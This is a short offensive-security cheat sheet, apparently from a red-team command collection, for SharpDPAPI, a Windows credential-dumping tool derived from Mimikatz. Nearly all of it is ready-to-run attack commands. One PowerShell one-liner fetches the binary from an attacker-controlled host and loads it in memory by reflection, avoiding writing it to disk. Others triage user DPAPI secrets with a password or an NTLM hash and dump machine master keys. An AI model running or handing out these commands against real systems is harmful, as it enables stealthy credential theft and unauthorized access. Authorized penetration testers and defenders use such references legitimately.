# SharpDPAPI

% SharpDPAPI, dpapi
#plateform/windows  #target/local   #cat/CREDENTIAL-ACCESS/DPAPI 

## _desc
```
C# port of some DPAPI functionality from @gentilkiwi's Mimikatz project
```

## _repo
```
https://github.com/GhostPack/SharpDPAPI
```

## _doc
```
```

## _install
```
```

## bin - download into memory
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<local_ip>:<port|80>/windows/NetFramework_4.7_x64/SharpDPAPI.exe'); $asm = [System.Reflection.Assembly]::Load($data); 
```
## assembly reflection - cmd
```powershell
$params="<cmd>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```

## ps1 - cmd
```powershell
Invoke-SharpDPAPI "<cmd>"
```

## user-triage - user (creds)
```powershell
SharpDPAPI.exe triage /password:<password>
```

## user-triage - user (pth)
```powershell
SharpDPAPI.exe triage /ntlm:<nt_hash>
```

## machine-triage - all reachable machine masterkey 
```powershell
SharpDPAPI.exe machinemasterkeys 
```

## machine-triage - all
```powershell
SharpDPAPI.exe machinetriage
```

